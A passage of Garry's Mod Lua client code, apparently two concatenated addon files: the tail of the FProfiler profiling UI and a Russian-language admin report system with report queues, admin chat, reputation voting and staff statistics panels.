    FProfiler.UI.onCurrentRealmUpdate("topLagSpikes", function(new)
        self:Clear()

        for _, row in ipairs(new) do
            if not row.func then break end

            local name = row.info.name and row.info.name ~= "" and (row.info.namewhat .. " " .. row.info.name) or "Unknown"
            local path = row.info.short_src
            local lines = path ~= "[C]" and row.info.linedefined .. " - " .. row.info.lastlinedefined or "N/A"
            local runtime = row.runtime * 100

            local line = self:AddLine(name, path, lines, runtime)
            line.data = row
        end
    end)

    FProfiler.UI.onCurrentRealmUpdate("currentSelected", function(new, old)
        if new == old then return end

        for _, line in pairs(self.Lines) do
            line:SetSelected(line.data.func == new.func)
        end
    end)
end

function TOPTENTAB:OnRowSelected(id, line)
    FProfiler.UI.updateCurrentRealm("currentSelected", line.data)
end

derma.DefineControl("FProfileTopTen", "", TOPTENTAB, "DListView")

--[[-------------------------------------------------------------------------
The Tab panel of the bottlenecks and top n lag spikes
---------------------------------------------------------------------------]]
local RESULTSHEET = {}

function RESULTSHEET:Init()
    self:DockMargin(0, 10, 0, 0)
    self:SetPadding(0)

    self.bottlenecksTab = vgui.Create("FProfileBottleNecks")
    self:AddSheet("Bottlenecks", self.bottlenecksTab)

    self.toptenTab = vgui.Create("FProfileTopTen")
    self:AddSheet("Top 50 most expensive function calls", self.toptenTab)

end


derma.DefineControl("FProfileResultSheet", "", RESULTSHEET, "DPropertySheet")

--[[-------------------------------------------------------------------------
The function details panel
---------------------------------------------------------------------------]]
local FUNCDETAILS = {}

function FUNCDETAILS:Init()
    self.titleLabel = vgui.Create("DLabel", self)
    self.titleLabel:SetDark(true)
    self.titleLabel:SetFont("DermaLarge")
    self.titleLabel:SetText("Function Details")
    self.titleLabel:SizeToContents()
    -- self.titleLabel:Dock(TOP)

    self.focus = vgui.Create("DButton", self)
    self.focus:SetText("Focus")
    self.focus:SetTall(50)
    self.focus:SetFont("DermaDefaultBold")
    self.focus:Dock(BOTTOM)

    function self.focus:DoClick()
        local sel = FProfiler.UI.getCurrentRealmValue("currentSelected")
        if not sel then return end

        FProfiler.UI.updateCurrentRealm("focusStr", sel.func)
    end

    self.source = vgui.Create("DTextEntry", self)
    self.source:SetKeyboardInputEnabled(false)
    self.source:DockMargin(0, 40, 0, 0)
    self.source:SetMultiline(true)
    self.source:Dock(FILL)

    FProfiler.UI.onCurrentRealmUpdate("sourceText", function(new)
        self.source:SetText(string.Replace(new, "\t", "    "))
    end)

    self.toConsole = vgui.Create("DButton", self)
    self.toConsole:SetText("Print Details to Console")
    self.toConsole:SetTall(50)
    self.toConsole:SetFont("DermaDefaultBold")
    self.toConsole:Dock(BOTTOM)

    function self.toConsole:DoClick()
        FProfiler.UI.updateCurrentRealm("toConsole", FProfiler.UI.getCurrentRealmValue("currentSelected"))
    end
end

function FUNCDETAILS:PerformLayout()
    self.titleLabel:CenterHorizontal()
end
derma.DefineControl("FProfileFuncDetails", "", FUNCDETAILS, "DPanel")

--[[-------------------------------------------------------------------------
The actual frame
---------------------------------------------------------------------------]]
local FRAME = {}

local frameInstance
function FRAME:Init()
    self:SetTitle("FProfiler profiling tool")
    self:SetSize(ScrW() * 0.8, ScrH() * 0.8)
    self:Center()
    self:SetVisible(true)
    self:MakePopup()
    self:SetDeleteOnClose(false)

    self.magicbar = vgui.Create("FProfileMagicBar", self)
    self.magicbar:SetTall(math.max(self:GetTall() * 0.07, 48))
    self.magicbar:Dock(TOP)

    self.resultsheet = vgui.Create("FProfileResultSheet", self)
    self.resultsheet:SetWide(self:GetWide() * 0.8)
    self.resultsheet:Dock(LEFT)

    self.details = vgui.Create("FProfileFuncDetails", self)
    self.details:SetWide(self:GetWide() * 0.2 - 12)
    self.details:DockMargin(5, 31, 0, 0)
    self.details:Dock(RIGHT)
end

function FRAME:OnClose()
    FProfiler.UI.updateModel("frameVisible", false)
end

derma.DefineControl("FProfileFrame", "", FRAME, "DFrame")

--[[-------------------------------------------------------------------------
The command to start the profiler
---------------------------------------------------------------------------]]
concommand.Add("FProfiler",
    function()
        frameInstance = frameInstance or vgui.Create("FProfileFrame")
        frameInstance:SetVisible(true)

        FProfiler.UI.updateModel("frameVisible", true)
    end,
    nil, "Starts FProfiler")

--PATH addons/admin_reports/lua/freports/cl_init.lua:
net.Receive( "rp.chat.SendMessage", function()
	local args = net.ReadTable()
	chat.AddText( unpack( args ) )
end)

local tallbar = ScrH() * .02314815
local tallbar_c = tallbar * .5

local function ScreenScale( size )
	return size * ( ScrH() / 480.0 )
end

local function DrawShadowText(text, font, x, y, color, x_a, y_a, color_shadow)
	color_shadow = color_shadow or Color(0, 0, 0,255)
	draw.SimpleText(text, font, x + 1, y + 1, color_shadow, x_a, y_a)
	local w,h = draw.SimpleText(text, font, x, y, color, x_a, y_a)
	return w,h
end

local function DrawBox(x,y,w,h,col,col_o)
	col_o = col_o or Color(0, 0, 0, 255)
	col = col or Color(10, 10, 10, 150)

	surface.SetDrawColor(col)
	surface.DrawRect(x,y,w,h)

	surface.SetDrawColor(col_o)
	surface.DrawOutlinedRect(x,y,w,h)
end

local blur = Material("pp/blurscreen")
local function DrawBlur(panel, amount)
	local x, y = panel:LocalToScreen(0, 0)
	local scrW, scrH = ScrW(), ScrH()

	surface.SetDrawColor(255, 255, 255)
	surface.SetMaterial(blur)
	for i = 1, 3 do
		blur:SetFloat("$blur", (i / 3) * (amount or 6))
		blur:Recompute()
		render.UpdateScreenEffectTexture()
		surface.DrawTexturedRect(x * -1, y * -1, scrW, scrH)
	end
end

local function FormatPlayedTime(time)
	if not time then return 'N/A' end

	local tmp = time
	local s = tmp % 60
	tmp = math.floor( tmp / 60 )
	local m = tmp % 60
	tmp = math.floor( tmp / 60 )
	local h = tmp % 24
	tmp = math.floor( tmp / 24 )
	local d = tmp % 7
	local w = math.floor( tmp / 7 )

	local toret = ""
	if w ~= 0 then
		toret = toret .. math.Round(w) .. "н "
	end

	if d ~= 0 and d < 7 then
		toret = toret .. math.Round(d) .. "д "
	end

	if h ~= 0 and h < 24 then
		toret = toret .. math.Round(h) .. "ч "
	end

	if m ~= 0 and m < 60 then
		toret = toret .. math.Round(m) .. "мин "
	end

	if s ~= 0 and s < 60 then
		toret = toret .. math.Round(s) .. "сек "
	end


	return toret
end

local rad 						= math.rad
local cos 						= math.cos
local sin 						= math.sin
local function DrawCircle(x, y, radius, seg)
	local cir = {}

	table.insert(cir, {
		x = x,
		y = y
	})

	for i = 0, seg do
		local a = rad((i / seg) * -360)

		table.insert(cir, {
			x = x + sin(a) * radius,
			y = y + cos(a) * radius
		})
	end

	local a = rad(0)

	table.insert(cir, {
		x = x + sin(a) * radius,
		y = y + cos(a) * radius
	})

	surface.DrawPoly(cir)
end

surface.CreateFont("reports_10", {
	font = "Roboto",
	size = ScreenScale( 10 ),
	weight = 1000,
	antialias = true,
	extended = true,
})

surface.CreateFont("reports_8", {
	font = "Roboto",
	size = ScreenScale( 8 ),
	weight = 1000,
	antialias = true,
	extended = true,
})

local PANEL = {}

function PANEL:Init()
	self.avatar = vgui.Create("AvatarImage", self)
	self.avatar:SetPaintedManually(true)
	self.button = vgui.Create("DButton", self.avatar)
	self.button:SetText("")
	self.button:SetPaintedManually(true)

	self.button.OnCursorEntered = function(this)
		surface.PlaySound("garrysmod/ui_hover.wav")
	end

	self.button.DoClick = function(this)
		surface.PlaySound("garrysmod/ui_click.wav")

		if self.picked_ply ~= nil then
			gui.OpenURL("http://steamcommunity.com/profiles/".. self.picked_ply)
		end
	end

	self.button.Paint = function(this, w, h)
		if (this.Depressed or this.m_bSelected) then
			surface.SetDrawColor(255, 155, 55, 40)
		elseif (this.Hovered) then
			surface.SetDrawColor(0,0,0,100)
		else
			surface.SetDrawColor(0,0,0,0)
		end

		surface.DrawRect(0,0,w,h)
	end
end

function PANEL:PerformLayout()
	self.avatar:SetSize(self:GetWide(), self:GetTall())
	self.button:SetSize(self:GetWide(), self:GetTall())
end

function PANEL:SetPlayer(ply, size)
	self.avatar:SetPlayer(ply, size)
	self.picked_ply = ply:SteamID64()
end

function PANEL:SetSteamID(sid, size)
	self.avatar:SetSteamID(sid, size)
	self.picked_ply = sid
end

function PANEL:Paint(w, h)
	render.ClearStencil()
	render.SetStencilEnable(true)
	render.SetStencilWriteMask(1)
	render.SetStencilTestMask(1)
	render.SetStencilFailOperation(STENCILOPERATION_REPLACE)
	render.SetStencilPassOperation(STENCILOPERATION_ZERO)
	render.SetStencilZFailOperation(STENCILOPERATION_ZERO)
	render.SetStencilCompareFunction(STENCILCOMPARISONFUNCTION_NEVER)
	render.SetStencilReferenceValue(1)
	draw.NoTexture()
	surface.SetDrawColor(Color(0, 0, 0, 255))
	DrawCircle(w * .5, h * .5, h * .5, 60)
	render.SetStencilFailOperation(STENCILOPERATION_ZERO)
	render.SetStencilPassOperation(STENCILOPERATION_REPLACE)
	render.SetStencilZFailOperation(STENCILOPERATION_ZERO)
	render.SetStencilCompareFunction(STENCILCOMPARISONFUNCTION_EQUAL)
	render.SetStencilReferenceValue(1)
	self.avatar:PaintManual()
	render.SetStencilEnable(false)
	render.ClearStencil()
end

vgui.Register("rp_avatar", PANEL, "Panel")

local function print_debug(net_name, l, text, ...)
	print("------------------------------")
	MsgC(Color(255,0,0), "[DEBUG] ", Color(255,155,55), net_name .. " (" .. l .. ") ", Color(255,255,255), text)
	print()
	print(...)
	print("------------------------------")
end

concommand.Add("rebuild_reports", function()
	if freports.r then freports.r:Remove() end
end)

function freports.OpenAdminMenu(tb)
	if IsValid(freports.a) then freports.a:Remove() end

	local ply = tb.reporter

	freports.a = vgui.Create("DFrame")
	freports.a:SetTitle("")
	freports.a:SetSize(ScrW()*.29, ScrH()*.25)
	freports.a:SetPos(2, 2)
	freports.a:ShowCloseButton(false)
	freports.a.Paint = function(self, w, h)
		DrawBlur(self, 5)
		DrawBox(0,0,w,h)
		DrawBox(0,0,w,tallbar)
		if not IsValid(ply) then return end
		DrawShadowText(ply:Nick(), "reports_8", w * .5, tallbar_c, team.GetColor(ply:Team()), 1, 1)
	end

	local ava = vgui.Create("rp_avatar", freports.a)
	ava:SetSize(freports.a:GetTall() * .3 - 4, freports.a:GetTall() * .3 - 4)
	ava:SetPos(freports.a:GetWide() *.35 * .5 - ava:GetTall() *.5, tallbar + 2)
	ava:SetPlayer(ply, 184)

	local scroll = vgui.Create("DScrollPanel", freports.a)
	scroll:SetPos(2, tallbar + 4 + ava:GetTall())
	scroll:SetSize(freports.a:GetWide() *.35, freports.a:GetTall() - tallbar - tallbar - 8 - ava:GetTall())

	local function add(name, command)
		local b = vgui.Create("DButton", scroll)
		b:Dock(TOP)
		b:DockMargin(0, 1, 0, 1)
		b:SetTall(tallbar)
		b:SetText('')
		b:SetFont("reports_8")

		b.DoClick = function()
			if isfunction(command) then
				command()
			end
		end

		b.Paint = function(self, w, h)
			DrawBox(0, 0, w, h, Color(0, 0, 0, 100))

			DrawShadowText(name, "reports_8", w*.5, h*.5, Color(255,255,255), 1, 1)
		end
	end

	add("Скопировать SteamID", function()
		SetClipboardText(ply:SteamID())
	end)
	add("Скопировать SteamID64", function()
		SetClipboardText(ply:SteamID64())
	end)
	add("Тп игрока к себе", function()
		RunConsoleCommand("ulx", "bring", ply:Nick())
	end)
	add("Тп к игроку", function()
		RunConsoleCommand("ulx", "goto", ply:Nick())
	end)
	add("Вернуть игрока", function()
		RunConsoleCommand("ulx", "return", ply:Nick())
	end)

	local report_chat = vgui.Create("RichText", freports.a)
	report_chat:SetSize(freports.a:GetWide() - scroll:GetWide() - 6, freports.a:GetTall() - tallbar*3 - 8)
	report_chat:SetPos(scroll:GetWide() + 4, freports.a:GetTall() - tallbar - tallbar - 6 - report_chat:GetTall())
	function report_chat:PerformLayout()
		self:SetFontInternal("reports_8")
		self:SetBGColor(Color(0,0,0,100))
	end

	freports.a.Chat = function(msg)
		local ply = msg[1]
		local text = msg[2]

		local job_col = team.GetColor(ply:Team())
		report_chat:InsertColorChange(job_col.r, job_col.g, job_col.b, 255)
		report_chat:AppendText(ply:Nick())
		report_chat:InsertColorChange(255, 255, 255, 255)
		report_chat:AppendText(": "..text.."\n")
	end

	local message = vgui.Create("DButton", freports.a)
	message:SetText("")
	message:SetPos(scroll:GetWide() + 4, freports.a:GetTall() - tallbar - tallbar - 4)
	message:SetSize(freports.a:GetWide() - scroll:GetWide() - 6, tallbar)
	message.DoClick = function()
		Derma_StringRequest(
			"Сообщение в репорт", 
			"Введите сообщение которое хотели бы отправить",
			"",
			function(text) net.Start("freports.message") net.WriteString(text) net.SendToServer() end
		)
	end
	message.Paint = function(self, w, h)
		DrawBox(0, 0, w, h, Color(0, 0, 0, 100))

		DrawShadowText("Написать сообщение", "reports_10", w*.5, h*.5, Color(255,255,255), 1, 1)
	end

	for k,v in ipairs(tb.report_chat) do
		freports.a.Chat(v)
	end

	local close = vgui.Create("DButton", freports.a)
	close:SetPos(2, freports.a:GetTall() - tallbar - 2)
	close:SetSize(freports.a:GetWide() - 4, tallbar)
	close:SetText("")

	close.DoClick = function()
		Derma_Query( "Вы уверены что хотите закрыть жалобу?", "Проверка", "Да", function()
			net.Start("freports.close")
			net.SendToServer()
		end, "Нет")
	end
	close.Paint = function(self, w, h)
		DrawBox(0, 0, w, h, Color(255, 155, 55, 100))

		DrawShadowText("Закрыть жалобу", "reports_8", w*.5, h*.5, Color(255,255,255), 1, 1)
	end
end

function freports.CreateMain()
	freports.r = vgui.Create("DPanel")
	freports.r:SetSize(ScrW()*.15 + tallbar + 2, ScrH()*.3)
	freports.r:SetPos(ScrW() - freports.r:GetWide(), ScrH() * .5 - freports.r:GetTall() * .5)
	freports.r.Paint = function(self, w, h)
		if not self:HasFocus() then self:RequestFocus() end
		DrawBlur(self, 5)
		DrawBox(0,0,w,h)
	end
	freports.r.hiden = false
	freports.r.total_reports = 0
	freports.r.created_reports = {}
	freports.r.fHide = function(self)
		freports.r:MoveTo(ScrW() - tallbar, ScrH() * .5 - freports.r:GetTall() * .5, 0.5, 0, -1, function()
			freports.r.hiden = true
		end)
	end

	freports.r.fShow = function(self)
		freports.r:MoveTo(ScrW() - freports.r:GetWide(), ScrH() * .5 - freports.r:GetTall() * .5, 0.5, 0, -1, function()
			freports.r.hiden = false
		end)
	end

	local info_bar = vgui.Create("DPanel", freports.r)
	info_bar:SetPos(0,0)
	info_bar:SetSize(freports.r:GetWide(), tallbar)
	info_bar.Paint = function(self, w, h)
		DrawBox(0,0,w,h)

		if freports.r.hiden then
			DrawShadowText(freports.r.total_reports, "reports_10", tallbar * .5, h*.5, Color(255,255,255), 1, 1)
		else
			DrawShadowText("Жалоб: " .. freports.r.total_reports, "reports_10", w*.5, h*.5, Color(255,255,255), 1, 1)
		end
	end

	local hide = vgui.Create("DButton", freports.r)
	hide:SetColor(Color(0,0,0,150))
	hide:SetPos(0, tallbar + 2)
	hide:SetSize(tallbar, freports.r:GetTall() - tallbar - 2)
	hide.DoClick = function(self)
		if freports.r.hiden then
			freports.r.fShow()
		else
			freports.r.fHide()
		end
	end

	hide.Paint = function(self, w, h)
		DrawBox(0,0,w,h)

		DrawShadowText(freports.r.hiden and "<" or ">", "reports_10", w*.5, h*.5, Color(255,255,255), 1, 1)
	end

	local scroll = vgui.Create("DScrollPanel", freports.r)
	scroll:SetPos(tallbar + 2, tallbar + 2)
	scroll:SetSize(freports.r:GetWide() - tallbar - 2, freports.r:GetTall() - tallbar - 2)

	freports.r.AddReport = function(tb)
		freports.r:Show()
		
		local b = vgui.Create("DButton", scroll)
		b:SetText('')
		b:Dock(TOP)
		b:DockMargin(2, 0, 2, 2)
		b:SetTall(scroll:GetTall() * .15)
		b.tb = tb
		freports.r.created_reports[tb.reporter] = b
		b.Paint = function(self, w, h)
			local ply = tb.reporter
			if not IsValid(ply) then 
				self:Remove()
				return 
			end

			local live = math.Round(CurTime() - tb.start)

			local col_o = Color(0,0,0)

			if live > 180 then
				col_o = Color(255,155,0)
			end

			if live > 300 then
				col_o = Color(255,0,0)
			end

			local col = Color(0,0,0,150)
			if (self.Depressed or self.m_bSelected) then
				DrawBox(0,0,w,h,Color(70, 70, 70, 100), col_o)
			elseif (self.Hovered) then
				DrawBox(0,0,w,h,ColorAlpha(col, col.a - 25), col_o)
			else
				DrawBox(0,0,w,h,col, col_o)
			end
			
			local _, fh = DrawShadowText(ply:Nick(), "reports_10", h + 2, 2, Color(255,255,255), 0, 0)
			DrawShadowText(FormatPlayedTime(live), "reports_10", h + 2, h - fh - 2, Color(255,255,255), 0, 0)
		end
		b.DoClick = function()
			--if LocalPlayer() == tb.reporter then return end

			freports.r.fHide()
			net.Start("freports.accept")
				net.WriteEntity(tb.reporter)
			net.SendToServer()
		end
		b.OnRemove = function()
			freports.r.created_reports[tb.reporter] = nil
			freports.r.total_reports = freports.r.total_reports - 1

			if freports.r.total_reports <= 0 then
				freports.r:Hide()
			end
		end

		local ava = vgui.Create("rp_avatar", b)
		ava:SetPos(2, 2)
		ava:SetSize(b:GetTall() - 4, b:GetTall() - 4)
		ava:SetPlayer(tb.reporter, 184)

		freports.r.total_reports = freports.r.total_reports + 1
	end
end

net.Receive("freports.send", function()
	local tb = net.ReadTable()

	-- print_debug("freports.send", 462, "пришел net на клиент", tb)

	if not tb then
		-- print_debug("freports.send", 465, "не пришла таблица в net", tb)
		return
	end
	if not tb.reporter then
		-- print_debug("freports.send", 469, "в таблице нет игрока", tb)
		return
	end
	if not tb.reporter:IsPlayer() then
		-- print_debug("freports.send", 472, "в таблице reporter не является игроком", tb)
		return
	end

	if tb.reporter == LocalPlayer() then
		if IsValid(freports.m) then freports.m:Remove() end
		freports.m = vgui.Create("DFrame")
		freports.m:SetSize(ScrW()*.25, ScrH()*.12 + tallbar + tallbar + 4)
		freports.m:SetPos(2, 2)
		freports.m:SetTitle("")
		freports.m.report = tb
		freports.m.OnClose = function()
			net.Start("freports.close")
			net.SendToServer()
		end
		freports.m.Paint = function(self, w, h)
			DrawBlur(self, 5)
			DrawBox(0,0,w,h)
			DrawBox(0,0,w,tallbar)
			DrawShadowText("Жалоба", "reports_8", w * .5, tallbar_c, Color(255,255,255), 1, 1)
		end

		local report_chat = vgui.Create("RichText", freports.m)
		report_chat:SetPos(2, tallbar + 2)
		report_chat:SetSize(freports.m:GetWide() - 4, freports.m:GetTall() - tallbar*3 - 8)
		function report_chat:PerformLayout()
			self:SetFontInternal("reports_8")
			self:SetBGColor(Color(0,0,0,100))
		end

		freports.m.Chat = function(msg)
			local ply = msg[1]
			if not IsValid(ply) then return end
			local text = msg[2]

			local job_col = team.GetColor(ply:Team())
			report_chat:InsertColorChange(job_col.r, job_col.g, job_col.b, 255)
			report_chat:AppendText(ply:Nick())
			report_chat:InsertColorChange(255, 255, 255, 255)
			report_chat:AppendText(": "..text.."\n")
		end

		local message = vgui.Create("DButton", freports.m)
		message:SetText("")
		message:SetPos(2, freports.m:GetTall() - tallbar - tallbar - 4)
		message:SetSize(freports.m:GetWide() - 4, tallbar)
		message.DoClick = function()
			Derma_StringRequest(
				"Сообщение в репорт", 
				"Введите сообщение которое хотели бы отправить",
				"",
				function(text) net.Start("freports.message") net.WriteString(text) net.SendToServer() end
			)
		end
		message.Paint = function(self, w, h)
			DrawBox(0, 0, w, h, Color(0, 0, 0, 100))

			DrawShadowText("Написать сообщение", "reports_10", w*.5, h*.5, Color(255,255,255), 1, 1)
		end

		local info_bar = vgui.Create("DPanel", freports.m)
		info_bar:SetPos(2, freports.m:GetTall() - tallbar - 2)
		info_bar:SetSize(freports.m:GetWide() - 4, tallbar)
		info_bar.Paint = function(self, w, h)
			DrawBox(0, 0, w, h, Color(0, 0, 0, 100))

			if IsValid(freports.m.report.admin) and freports.m.report.admin.Nick then
				DrawShadowText(freports.m.report.admin:Nick(), "reports_10", w*.5, h*.5, team.GetColor(freports.m.report.admin:Team()), 1, 1)
			else
				DrawShadowText("Ожидаем администратора...", "reports_10", w*.5, h*.5, Color(255,255,255), 1, 1)
			end
		end

		for k,v in ipairs(freports.m.report.report_chat) do
			freports.m.Chat(v)
		end
	end

	if freports.config.WhoCanReceiveReports[LocalPlayer():GetUserGroup()] then
		if not IsValid(freports.r) then 
			freports.CreateMain()
		end

		if not freports.r.hiden then
			surface.PlaySound("HL1/fvox/bell.wav")
		end
		freports.r.AddReport(tb)
	end
end)

net.Receive("freports.accept", function()
	local rep = net.ReadEntity()
	local admin = net.ReadEntity()

	if not admin:IsPlayer() then admin = nil end

	-- print_debug("freports.accept", 567, "пришел net на клиент", rep, admin)

	if admin and IsValid(admin) then
		if admin == LocalPlayer() then
			freports.OpenAdminMenu(net.ReadTable())
		end

		if IsValid(freports.m) and rep == LocalPlayer() then
			freports.m.report.admin = admin

			surface.PlaySound("HL1/fvox/bell.wav")
		end
	end

	if IsValid(freports.r) and IsValid(freports.r.created_reports[rep]) then
		freports.r.created_reports[rep]:Remove()
	end
end)

net.Receive("freports.close", function()
	if IsValid(freports.m) then freports.m:Remove() end
	if IsValid(freports.a) then freports.a:Remove() end

	if IsValid(freports.r) and freports.config.WhoCanReceiveReports[LocalPlayer():GetUserGroup()] and freports.r.fShow then
		freports.r.fShow()
	end
end)

net.Receive("freports.message", function() 
	local tb = net.ReadTable()

	if IsValid(freports.m) then freports.m.Chat(tb) end
	if IsValid(freports.a) then freports.a.Chat(tb) end

	surface.PlaySound("npc/turret_floor/ping.wav")
end)

net.Receive("freports.adm_stats", function()
	local logs = net.ReadTable()

	local main = vgui.Create("DFrame")
	main:SetSize(ScrW()*.4, ScrH()*.6)
	main:Center()
	main:MakePopup()
	main.Paint = function(self, w, h)
		DrawBlur(self, 5)
		DrawBox(0,0,w,h)
		DrawBox(0,0,w,tallbar)
		DrawShadowText("Последний раз принимали жалобы", "reports_8", w * .5, tallbar_c, Color(255,255,255), 1, 1)
	end

	main:SetTitle("")

	local logs_main = vgui.Create("DFrame")
	logs_main:SetSize(ScrW()*.25, main:GetTall())

	main:SetPos(ScrW() * .5 - main:GetWide()*.5 + logs_main:GetWide() * .5, ScrH() * .5 - main:GetTall()*.5)

	logs_main:SetTitle('')
	local x, y = main:GetPos()
	logs_main:SetPos(x - logs_main:GetWide() - 2, y)
	logs_main:ShowCloseButton(false)
	logs_main.Paint = function(self, w, h)
		local x, y = main:GetPos()
		self:SetPos(x - self:GetWide() - 2, y)
		DrawBlur(self, 5)
		DrawBox(0,0,w,h)
		DrawBox(0,0,w,tallbar)
		DrawShadowText("Мини логи", "reports_8", w * .5, tallbar_c, Color(255,255,255), 1, 1)
	end

	main.OnClose = function()
		if IsValid(logs_main) then logs_main:Remove() end
	end

	local scroll = vgui.Create("DScrollPanel", main)
	scroll:SetPos(2, tallbar + 2)
	scroll:SetSize(main:GetWide() - 4, main:GetTall() - tallbar - 4)

	local admins = table.Filter(player.GetAll(), function(a) return (freports.config.WhoCanReceiveReports[a:GetUserGroup()] or false) end)

	for k,v in ipairs(admins) do
		local b = vgui.Create("DPanel", scroll)
		b:Dock(TOP)
		b:DockMargin(0,1,0,1)
		b:SetTall(main:GetTall() * .07)
		b.Paint = function(self,w,h)
			DrawBox(0,0,w,h,Color(0,0,0,150))
			if not IsValid(v) then return end
				
			local last_report = v:GetNetVar("rp.LastReport") and CurTime() - v:GetNetVar("rp.LastReport") or 0
				
			DrawShadowText(v:Nick(), "reports_10", h + 2, h *.5, team.GetColor(v:Team()), 0, 1)
			
			
			local col = Color(0, 255, 125)
			
			if last_report > 180 then col = Color(255, 255, 125) end
			if last_report > 240 then col = Color(255,155,55) end
			if last_report > 420 then col = Color(255, 120, 120) end
			
			DrawShadowText(freports.FormatRankName(v), "reports_10", w * .5, h *.5, freports.FormatRankColor(v), 1, 1)

			DrawShadowText(v:GetNetVar("rp.ReportClaimed") and "Разбирает жалобу!" or last_report == 0 and "-" or FormatPlayedTime(last_report), "reports_10", w - 2, h *.5, col, 2, 1)
		end
		
		local ava = vgui.Create("rp_avatar", b)
		ava:SetPos(2, 2)
		ava:SetSize(b:GetTall() - 4, b:GetTall() - 4)
		ava:SetPlayer(v, 184)
	end

	local logs_scroll = vgui.Create("DScrollPanel", logs_main)
	logs_scroll:SetPos(2, tallbar + 2)
	logs_scroll:SetSize(logs_main:GetWide() - 4, logs_main:GetTall() - 4 - tallbar)

	for k,v in ipairs(logs) do
		local log = vgui.Create("DPanel", logs_scroll)
		log:Dock(TOP)
		log:DockMargin(0,1,0,1)
		log:SetTall(logs_main:GetTall() * .07)
		if v.rtype == "create" then
			log.Paint = function(self,w,h)
				DrawBox(0,0,w,h,Color(0,0,0,150))

				local fw = DrawShadowText(v.rep_ply_name, "reports_10", h + 2, h *.5, team.GetColor(v.rep_ply_job), 0, 1)
				DrawShadowText(" написал жалобу (".. os.date("%H:%M", v.rep_start) .. ")", "reports_10", h + 2 + fw, h *.5, Color(255, 255, 255), 0, 1)
			end

			local ava = vgui.Create("rp_avatar", log)
			ava:SetPos(2, 2)
			ava:SetSize(log:GetTall() - 4, log:GetTall() - 4)
			ava:SetSteamID(v.rep_ply_id, 184)
		elseif v.rtype == "accept" then
			surface.SetFont("reports_10")
			local fw = surface.GetTextSize(v.admin_name .. " принял жалобу (".. os.date("%H:%M", v.rep_accepted) .. ")")
			log.Paint = function(self,w,h)
				DrawBox(0,0,w,h,Color(0,0,0,150))

				local _ = DrawShadowText(v.admin_name, "reports_10", h + 2, h *.5, team.GetColor(v.admin_job), 0, 1)
				DrawShadowText(" принял жалобу (".. os.date("%H:%M", v.rep_accepted) .. ")", "reports_10", h + 2 + _, h *.5, Color(255, 255, 255), 0, 1)

				DrawShadowText(v.rep_ply_name, "reports_10", h + 8 + fw + h, h *.5, team.GetColor(v.rep_ply_job), 0, 1)
			end

			local adm_ava = vgui.Create("rp_avatar", log)
			adm_ava:SetSize(log:GetTall() - 4, log:GetTall() - 4)
			adm_ava:SetPos(2, 2)
			adm_ava:SetSteamID(v.admin_id, 184)

			local rep_ava = vgui.Create("rp_avatar", log)
			rep_ava:SetSize(log:GetTall() - 4, log:GetTall() - 4)
			rep_ava:SetPos(10 + rep_ava:GetWide() + fw, 2)
			rep_ava:SetSteamID(v.rep_ply_id, 184)
		end
	end
end)

net.Receive("freports.reputation", function()
	local main = vgui.Create("DFrame")
	main:SetSize(ScrW()*.25, ScrH()*.1)
	main:SetTitle('')
	main:Center()
	main:MakePopup()

	main.Paint = function(self, w, h)
		DrawBlur(self, 5)
		DrawBox(0,0,w,h)
		DrawBox(0,0,w,tallbar)
		DrawShadowText("Оцените работу администрации", "reports_8", w * .5, tallbar_c, Color(255,255,255), 1, 1)
	end

	local ye = vgui.Create("DButton", main)
	ye:SetPos(2, tallbar + 2)
	ye:SetSize(main:GetWide() * .5 - 3, main:GetTall() - 6 - tallbar - tallbar)
	ye:SetText('')
	ye.Paint = function(self, w, h)
		DrawBox(0,0,w,h, Color(100, 255, 100, 100))
		DrawShadowText("+rep", "reports_10", w * .5, h * .5, Color(255,255,255), 1, 1)
	end
	ye.DoClick = function(self)
		net.Start("freports.reputation")
			net.WriteBool(true)
		net.SendToServer()
		main:Remove()
	end

	local no = vgui.Create("DButton", main)
	no:SetPos(main:GetWide() * .5 + 1, tallbar + 2)
	no:SetSize(main:GetWide() * .5 - 3, main:GetTall() - 6 - tallbar - tallbar)
	no:SetText('')
	no.Paint = function(self, w, h)
		DrawBox(0,0,w,h, Color(255, 100, 100, 100))
		DrawShadowText("-rep", "reports_10", w * .5, h * .5, Color(255,255,255), 1, 1)
	end
	no.DoClick = function(self)
		net.Start("freports.reputation")
			net.WriteBool(false)
		net.SendToServer()
		main:Remove()
	end

	local statistic = vgui.Create("DButton", main)
	statistic:SetPos(2, main:GetTall() - tallbar - 2)
	statistic:SetSize(main:GetWide() - 4, tallbar)
	statistic:SetText('')
	statistic.Paint = function(self, w, h)
		DrawBox(0,0,w,h)
		DrawShadowText("Статистика администратора", "reports_10", w * .5, h * .5, Color(255,255,255), 1, 1)
	end
	statistic.DoClick = function(self)
		net.Start("freports.request_admin_statistic")
		net.SendToServer()
	end

	main.OnClose = function()
		net.Start("freports.reputation")
			net.WriteBool(false)
		net.SendToServer()
	end
end)

net.Receive("freports.reports_statistics", function()
	local data = net.ReadTable()

	data = table.Filter(data, function(v)
		return freports.config.WhoCanReceiveReports[v.rank] or false
	end)

	table.sort( data, function(a, b) return tonumber(a.rep) > tonumber(b.rep) end )

	-- PrintTable(data)

	local page = 0
	local main = vgui.Create("DFrame")
	main:SetSize(ScrW()*.4, ScrH()*.6)
	main:SetTitle('')
	main:Center()
	main:MakePopup()

	main.Paint = function(self, w, h)
		DrawBlur(self, 5)
		DrawBox(0,0,w,h)
		DrawBox(0,0,w,tallbar)
		DrawShadowText("Статистика администрации", "reports_8", w * .5, tallbar_c, Color(255,255,255), 1, 1)
	end

	local scroll = vgui.Create("DScrollPanel", main)
	scroll:SetPos(2, tallbar + tallbar + 4)
	scroll:SetSize(main:GetWide() - 4, main:GetTall() - tallbar - tallbar - tallbar - 8)
	
	local top_bar = vgui.Create("DPanel", main)
	top_bar:SetPos(2, tallbar + 2)
	top_bar:SetSize(main:GetWide() - 4, tallbar)
	top_bar.Paint = function(self, w, h)
		DrawBox(0,0,w,h)

		DrawShadowText("Игрок", "reports_10", h, h*.5, Color(255,255,255), 0, 1)
		DrawShadowText("Ранг", "reports_10", w*.35, h*.5, Color(255,255,255), 1, 1)
		DrawShadowText("Всего жалоб", "reports_10", w*.65, h*.5, Color(255,255,255), 1, 1)
		DrawShadowText("Репутация", "reports_10", w - 8, h*.5, Color(255,255,255), 2, 1)
	end
	
	local sheet = {}
	local load_more
	local function AddB(k, v)
		if not freports.config.WhoCanReceiveReports[v.rank] then return end
		local p = vgui.Create("DButton", scroll)
		table.insert(sheet, p)
		p:SetText('')
		p:Dock(TOP)
